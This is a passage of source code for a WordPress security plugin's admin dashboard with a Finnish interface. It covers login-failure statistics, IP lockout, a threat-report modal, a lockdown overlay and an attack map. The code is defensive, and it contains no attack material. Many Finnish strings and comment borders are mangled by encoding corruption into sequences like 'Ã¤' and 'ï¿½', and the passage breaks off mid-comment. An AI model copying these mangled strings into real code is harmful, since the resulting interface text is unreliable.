              <span class="text-xs font-bold text-slate-600">EpÃ¤onnistuneet Kirjautumiset (24h)</span>
              <span class="bg-red-100 text-red-700 font-bold px-2 py-0.5 rounded-full text-xs">842</span>
            </div>
            <div class="flex justify-between items-center mb-2">
              <span class="text-xs font-bold text-slate-600">Lukitut IP:t</span>
              <span class="bg-slate-100 text-slate-700 font-bold px-2 py-0.5 rounded-full text-xs">15</span>
            </div>
            <div class="flex justify-between items-center">
              <span class="text-xs font-bold text-slate-600">Aktiiviset JÃ¤rjestelmÃ¤nvalvojat</span>
              <span class="bg-green-100 text-green-700 font-bold px-2 py-0.5 rounded-full text-xs">2</span>
            </div>
            <div class="widget-settings-panel w-full mt-4">
              <div class="flex flex-col gap-4">
                <!-- YlÃ¤osa: Kaavio ja Asetukset -->
                <div class="bg-white rounded border border-slate-200 p-4 shadow-sm w-full">
                  <div class="flex justify-between items-center mb-3">
                    <div class="flex items-center gap-3">
                      <h4 class="text-sm font-bold text-slate-700">Kirjautumisyritykset</h4>
                      <select id="login-timeframe-filter" class="text-xs border border-slate-200 rounded px-2 py-1 text-slate-600 bg-slate-50" onchange="pmcSec.fetchLoginSubModalData()">
                        <option value="24h">24 tuntia</option>
                        <option value="7d">7 pÃ¤ivÃ¤Ã¤</option>
                        <option value="30d">30 pÃ¤ivÃ¤Ã¤</option>
                      </select>
                    </div>
                    <div class="flex gap-4">
                      <label class="flex items-center gap-2 text-xs text-slate-600">
                        Lukitse IP 
                        <input type="number" id="quick-login-attempts" min="1" max="100" class="w-16 h-6 px-1 text-center border-slate-300 rounded text-pink-600 focus:ring-pink-500 bg-white" onchange="pmcSec.updateLoginAttempts(this.value)"> 
                        epÃ¤onnistuneen yrityksen jÃ¤lkeen
                      </label>
                    </div>
                  </div>
                  <div style="height: 250px; width: 100%;">
                    <canvas id="loginChart"></canvas>
                  </div>
                </div>
                <!-- Alaosa: Taulukko -->
                <div class="bg-white rounded border border-slate-200 p-4 shadow-sm w-full flex flex-col">
                  <div class="flex justify-between items-center mb-3">
                    <h4 class="text-sm font-bold text-slate-700">ViimeisimmÃ¤t Kirjautumistapahtumat</h4>
                    <button class="text-xs bg-slate-100 hover:bg-slate-200 px-3 py-1.5 rounded font-bold text-slate-700" onclick="pmcSec.fetchLoginSubModalData()">PÃ¤ivitÃ¤</button>
                  </div>
                  <div class="overflow-y-auto flex-grow" style="max-height: 280px;">
                    <table class="w-full text-left text-xs" id="login-events-table">
                      <thead class="sticky top-0 bg-slate-50 text-slate-500 shadow-[0_1px_2px_rgba(0,0,0,0.05)]">
                        <tr>
                          <th class="p-3 font-semibold border-b">Aika</th>
                          <th class="p-3 font-semibold border-b">Tapahtuma</th>
                          <th class="p-3 font-semibold border-b">IP-osoite</th>
                          <th class="p-3 font-semibold border-b">Maa</th>
                          <th class="p-3 font-semibold border-b text-right">Toiminto</th>
                        </tr>
                      </thead>
                      <tbody>
                        <tr><td colspan="5" class="text-center p-4 text-slate-400">Ladataan tietoja...</td></tr>
                      </tbody>
                    </table>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div class="grid-cell" id="cell-8" data-cell="8">
          <!-- 7. Node Health [NEW] -->
          <div class="glass-card p-4 w-[280px]" id="w-node-health">
            <span class="material-symbols-outlined drag-handle" style="top:12px;left:12px;">drag_indicator</span><button class="widget-maximize" title="Suurenna"><span class="material-symbols-outlined">open_in_full</span></button>
            <div class="flex items-center gap-2 mb-3 mt-1 ml-5">
              <span class="material-symbols-outlined text-green-600">hub</span>
              <h3 class="font-bold text-slate-800 text-sm">Solmun Tila</h3>
            </div>
            <div class="flex flex-col gap-3">
              <div>
                <div class="flex justify-between text-xs font-bold text-slate-700 mb-1">
                  <span>Helsinki-Edge-1</span>
                  <span class="text-green-600">14ms</span>
                </div>
                <div class="w-full bg-slate-200 h-1.5 rounded-full"><div class="bg-green-500 h-1.5 rounded-full" style="width:14%"></div></div>
              </div>
              <div>
                <div class="flex justify-between text-xs font-bold text-slate-700 mb-1">
                  <span>Vantaa-DC-01</span>
                  <span class="text-yellow-600">48ms</span>
                </div>
                <div class="w-full bg-slate-200 h-1.5 rounded-full"><div class="bg-yellow-500 h-1.5 rounded-full" style="width:48%"></div></div>
              </div>
              <div>
                <div class="flex justify-between text-xs font-bold text-slate-700 mb-1">
                  <span>Helsinki-Cluster-B</span>
                  <span class="text-red-600">210ms (Kuormituksen alaisena)</span>
                </div>
                <div class="w-full bg-slate-200 h-1.5 rounded-full"><div class="bg-red-500 h-1.5 rounded-full" style="width:95%"></div></div>
              </div>
            </div>
          </div>
        </div>

      </div><!-- /ps-widgets -->
    </div><!-- /ps-map-area -->
  </div><!-- /ps-main -->
</div><!-- /ps-shell -->

<!-- ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½
     THREAT MODAL
ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ -->
<div id="threat-modal-backdrop" onclick="if(event.target===this)closeModal()">
  <div id="threat-modal">
    <button class="modal-close" onclick="closeModal()">
      <span class="material-symbols-outlined">close</span>
    </button>
    <div style="display:flex;align-items:center;gap:8px;margin-bottom:16px;color:#dc2626;">
      <span class="material-symbols-outlined" style="font-size:32px;">warning</span>
      <h2 style="font-size:18px;font-weight:700;color:#111;">Uhkaraportti</h2>
    </div>
    <div class="modal-section">
      <div class="modal-section-title">Uhan LÃ¤hde</div>
      <div class="modal-grid">
        <div><span class="lbl">Maa:</span></div><div><span class="val" id="modal-origin">ï¿½?"</span></div>
        <div><span class="lbl">IP:</span></div><div><span class="val modal-ip" id="modal-ip">ï¿½?"</span></div>
        <div><span class="lbl">HyÃ¶kkÃ¤ys:</span></div><div><span class="val" id="modal-attack">ï¿½?"</span></div>
      </div>
    </div>
    <div class="modal-section">
      <div class="modal-section-title">Kohderesurssi</div>
      <div class="modal-grid">
        <div><span class="lbl">IsÃ¤ntÃ¤:</span></div><div><span class="val" id="modal-host">ï¿½?"</span></div>
        <div><span class="lbl">PÃ¤Ã¤tepiste:</span></div><div><span class="val" style="font-family:monospace;" id="modal-endpoint">ï¿½?"</span></div>
      </div>
    </div>
    <div class="modal-status-row">
      <span id="modal-status" style="color:#dc2626;">ï¿½?"</span>
      <span id="modal-status-container" style="color:#dc2626;display:flex;align-items:center;gap:5px;">
        <span id="modal-status-dot" style="width:7px;height:7px;border-radius:50%;background:#dc2626;animation:blink 1.2s infinite;display:inline-block;"></span>
        <span id="modal-status-label">Aktiivinen Murtoyritys</span>
      </span>
    </div>
    <div class="modal-actions">
      <button class="btn-dismiss" onclick="closeModal()">OHITA</button>
      <button class="btn-ban" id="btn-block-ip">EST&Auml; IP</button>
    </div>
  </div>
</div>

<!-- ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½
     LOCKDOWN OVERLAY
ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ -->
<div id="lockdown-overlay">
  <span class="material-symbols-outlined" style="font-size:80px;color:#fca5a5;">lock_person</span>
  <h1>Jï¿½"RJESTELMï¿½"N SULKUTILA AKTIIVINEN</h1>
  <p>Kaikki ulkoiset yhteydet on keskeytetty.</p>
  <button class="btn-disengage" onclick="disableLockdown()">POISTA SULKUTILA</button>
</div>

<!-- ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½
     SECURITY MODULES (INCLUDES)
ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ -->
<div id="ps-modules-container">
	<?php
	$modules_dir = __DIR__ . '/security-modules/';
	require_once $modules_dir . 'view-firewall.php';
	require_once $modules_dir . 'view-hardening.php';
	require_once $modules_dir . 'view-scanner.php';
	require_once $modules_dir . 'view-advanced.php';
	require_once $modules_dir . 'view-headers.php';
	require_once $modules_dir . 'view-audit-log.php';
	require_once $modules_dir . 'view-notifications.php';
	require_once $modules_dir . 'view-modules-overview.php';
	?>
</div>

<style>
/* ï¿½"?ï¿½"? Modular UI Styles ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
#ps-modules-container {
	display: none; /* Hidden by default until a module is clicked */
	flex: 1;
	flex-direction: column;
	min-height: 0;
}
.ps-module {
	position: relative;
	flex: 1;
	background: #f8fafc;
	display: flex;
	flex-direction: column;
	overflow-y: auto;
	min-height: 0;
}
.ps-module-header {
	display: flex; justify-content: space-between; align-items: center;
	padding: 20px 30px;
	border-bottom: 1px solid #e5e7eb;
	background: #fff;
}
.ps-module-header h2 {
	margin: 0; color: #111827; font-size: 20px;
	display: flex; align-items: center; gap: 10px;
}
.ps-module-close {
	background: none; border: none; color: #6b7280;
	font-size: 24px; cursor: pointer; transition: color 0.2s;
}
.ps-module-close:hover { color: #111827; }
.ps-module-content {
	padding: 30px;
	color: #4b5563;
}
/* Cards */
.ps-card {
	background: #fff;
	border: 1px solid #e5e7eb;
	border-radius: 12px;
	padding: 20px;
	box-shadow: 0 1px 3px rgba(0,0,0,0.05);
}
.ps-card h3 { margin-top: 0; color: #111827; font-size: 16px; margin-bottom: 8px; }
.ps-desc { margin-top: 0; color: #6b7280; font-size: 13px; margin-bottom: 15px; }

/* Tabs */
.ps-tabs { display: flex; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid #e5e7eb; padding-bottom: 10px;}
.ps-tab-btn { background: none; border: none; color: #6b7280; padding: 8px 16px; cursor: pointer; border-radius: 6px; font-weight: 500;}
.ps-tab-btn.active { background: rgba(184,0,72,0.08); color: #b80048; }
.ps-tab-content { display: none; }
.ps-tab-content.active { display: block; }

/* Controls */
.ps-control-row { display: flex; align-items: center; gap: 12px; margin-bottom: 15px; }
.ps-switch { position: relative; display: inline-block; width: 44px; height: 24px; }
.ps-switch input { opacity: 0; width: 0; height: 0; }
.ps-slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #d1d5db; transition: .4s; border-radius: 24px; }
.ps-slider:before { position: absolute; content: ""; height: 18px; width: 18px; left: 3px; bottom: 3px; background-color: white; transition: .4s; border-radius: 50%; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
.ps-switch input:checked + .ps-slider { background-color: #b80048; }
.ps-switch input:checked + .ps-slider:before { transform: translateX(20px); }

.ps-input-group { display: flex; flex-direction: column; gap: 6px; margin-bottom: 15px; }
.ps-input-group label { font-size: 13px; color: #6b7280; font-weight: 500; }
.ps-input, .ps-input-group input { background: #fff; border: 1px solid #d1d5db; color: #111827; padding: 8px 12px; border-radius: 6px; outline: none; }
.ps-input:focus, .ps-input-group input:focus { border-color: #b80048; box-shadow: 0 0 0 2px rgba(184,0,72,0.1); }

.ps-btn { padding: 8px 16px; border-radius: 6px; font-weight: 500; cursor: pointer; border: none; transition: 0.2s; }
.ps-btn-primary { background: #b80048; color: #fff; }
.ps-btn-primary:hover { background: #96003b; }
.ps-btn-danger { background: #dc2626; color: #fff; }
.ps-table { width: 100%; border-collapse: collapse; font-size: 13px; }
.ps-table th { text-align: left; padding: 10px; border-bottom: 1px solid #e5e7eb; color: #6b7280; font-weight: 600; }
.ps-table td { padding: 10px; border-bottom: 1px solid #f3f4f6; color: #374151; }
.mt-4 { margin-top: 20px; }
</style>

<script>
function psOpenModule(moduleId) {
	// Update URL without reloading so refresh keeps the same module
	let newSlug = 'pecodex-security';
	if (moduleId !== 'none') {
		newSlug = 'pecodex-security-' + moduleId;
	}
	if (new URLSearchParams(window.location.search).get('page') !== newSlug) {
		window.history.pushState({}, '', '?page=' + newSlug);
	}

	// Hide all modules
	document.querySelectorAll('.ps-module').forEach(el => el.style.display = 'none');
	
	// Update active sidebar nav
	document.querySelectorAll('.sidebar-nav a').forEach(el => el.classList.remove('active'));
	
	const modContainer = document.getElementById('ps-modules-container');
	const mapArea = document.getElementById('ps-map-area');

	if (moduleId === 'none') {
		// Dashboard view active
		if (modContainer) modContainer.style.display = 'none';
		if (mapArea) {
			mapArea.style.display = 'block';
			if (typeof window.refreshSecurityMap === 'function') {
				window.refreshSecurityMap();
			}
		}
		document.querySelector('.sidebar-nav a:first-child').classList.add('active');
		return;
	}

	// Hide dashboard map area
	if (mapArea) mapArea.style.display = 'none';
	if (modContainer) modContainer.style.display = 'flex';

	// Show requested module
	const mod = document.getElementById('ps-module-' + moduleId);
	if (mod) mod.style.display = 'flex';

	// Highlight current link
	const links = document.querySelectorAll('.sidebar-nav a');
	links.forEach(link => {
		if (link.getAttribute('onclick') && link.getAttribute('onclick').includes(moduleId)) {
			link.classList.add('active');
		}
	});
}
<?php
	// Determine initial module from URL
	$current_page = isset($_GET['page']) ? sanitize_text_field($_GET['page']) : 'pecodex-security';
	$initial_module = 'none';
	if ($current_page === 'pecodex-security-firewall') $initial_module = 'firewall';
	elseif ($current_page === 'pecodex-security-hardening') $initial_module = 'hardening';
	elseif ($current_page === 'pecodex-security-scanner') $initial_module = 'scanner';
	elseif ($current_page === 'pecodex-security-advanced') $initial_module = 'advanced';
	elseif ($current_page === 'pecodex-security-headers') $initial_module = 'headers';
	elseif ($current_page === 'pecodex-security-audit-log') $initial_module = 'audit-log';
	elseif ($current_page === 'pecodex-security-notifications') $initial_module = 'notifications';
	elseif ($current_page === 'pecodex-security-modules-overview') $initial_module = 'modules-overview';
?>

document.addEventListener('DOMContentLoaded', () => {
	// Move modules container into ps-main so it acts as a pane
	const main = document.getElementById('ps-main');
	const modContainer = document.getElementById('ps-modules-container');
	if (main && modContainer) {
		main.appendChild(modContainer);
	}

	// Open initial module based on WP admin submenu
	psOpenModule('<?php echo esc_js($initial_module); ?>');

	// Close module handlers
	document.querySelectorAll('.ps-module-close').forEach(btn => {
		btn.addEventListener('click', () => {
			// Instead of just hiding, update the URL to main dashboard without reloading
			window.history.pushState({}, '', '?page=pecodex-security');
			psOpenModule('none');
		});
	});

	// Tabs handler
	document.querySelectorAll('.ps-tab-btn').forEach(btn => {
		btn.addEventListener('click', (e) => {
			const target = e.target.getAttribute('data-target');
			const tabsContainer = e.target.closest('.ps-module-content');
			tabsContainer.querySelectorAll('.ps-tab-btn').forEach(b => b.classList.remove('active'));
			tabsContainer.querySelectorAll('.ps-tab-content').forEach(c => c.classList.remove('active'));
			e.target.classList.add('active');
			tabsContainer.querySelector(target).classList.add('active');
		});
	});

	// Sidenav tabs handler
	document.querySelectorAll('.ps-sidenav-tab').forEach(btn => {
		btn.addEventListener('click', (e) => {
			e.preventDefault();
			const el = e.currentTarget;
			const target = el.getAttribute('data-target');
			const tabsContainer = el.closest('.ps-module-content');
			tabsContainer.querySelectorAll('.ps-sidenav-tab').forEach(b => b.classList.remove('active'));
			tabsContainer.querySelectorAll('.ps-tweak-tab-content').forEach(c => c.style.display = 'none');
			el.classList.add('active');
			tabsContainer.querySelector(target).style.display = 'block';
		});
	});
});
</script>

<!-- ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½
     SCRIPTS
ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ï¿½.ï¿½ -->
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {

<?php
  // Fetch real server location (cached from ip-api)
  $server_geo = Pecodex_Security_API::get_server_location();
  $server_lat = $server_geo['lat'];
  $server_lng = $server_geo['lng'];
  $server_city = $server_geo['city'] !== 'Unknown' ? strtoupper($server_geo['city']) : 'SERVER HUB';
?>
/* ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?
   LOCATIONS  (lat, lng)
ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
const locations = {
  hub: [<?php echo esc_js($server_lat); ?>, <?php echo esc_js($server_lng); ?>],
};

/* ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?
   MAP INIT  (light tiles)
ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
const map = L.map('security-map', {
  center: locations.hub,
  zoom: 4,
  zoomControl: false,
  attributionControl: false,
  scrollWheelZoom: true,
  dragging: true,
  doubleClickZoom: true,
  keyboard: true,
  touchZoom: true,
});
window.psSecurityMap = map;

// Light CartoDB tile
L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png', {
  subdomains: 'abcd',
  maxZoom: 19,
}).addTo(map);

L.control.zoom({ position: 'bottomright' }).addTo(map);

/* ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?
   MAP MARKERS + TOOLTIPS
ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"? */
function makeIcon(color) {
  return L.divIcon({
    className: '',
    html: `<svg width="14" height="14" viewBox="0 0 14 14">
             <circle cx="7" cy="7" r="5" fill="${color}" opacity="0.9"/>
             <circle cx="7" cy="7" r="5" fill="none" stroke="${color}" stroke-width="2" opacity="0.3">
               <animate attributeName="r" from="5" to="10" dur="1.6s" repeatCount="indefinite"/>
               <animate attributeName="opacity" from="0.5" to="0" dur="1.6s" repeatCount="indefinite"/>
             </circle>
           </svg>`,
    iconSize: [14, 14],
    iconAnchor: [7, 7],
  });
}

// Hub marker
L.marker(locations.hub, { icon: makeIcon('#2563eb'), interactive: false })
  .addTo(map)
  .bindTooltip('<?php echo esc_js($server_city); ?>', {
    permanent: true, direction: 'right', offset: [10, 0],
    className: 'map-label-tooltip hub'
  });

let activeMapEvents = [];
let activeMarkers = [];

function updateMapMarkers(events) {
  activeMarkers.forEach(m => map.removeLayer(m));
  activeMarkers = [];
  
  events.forEach(e => {
    if (!e.lat || !e.lng) return;
    const color = e.statusClass === 'critical' ? '#dc2626' : (e.statusClass === 'info' ? '#3b82f6' : '#f59e0b');
    const marker = L.marker([e.lat, e.lng], { icon: makeIcon(color), interactive: false })
      .addTo(map)
      .bindTooltip(`${e.country} ï¿½?" ${e.city}`, {
        permanent: false, direction: 'right', offset: [10, 0],
        className: 'map-label-tooltip ' + (e.statusClass === 'critical' ? 'critical' : (e.statusClass === 'info' ? 'info' : ''))
      });
    activeMarkers.push(marker);
  });
}

/* ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?ï¿½"?
   ATTACK SVG LINES (screen coords)
   Drawn after map is ready so lat/lng ï¿½?' px is accurate
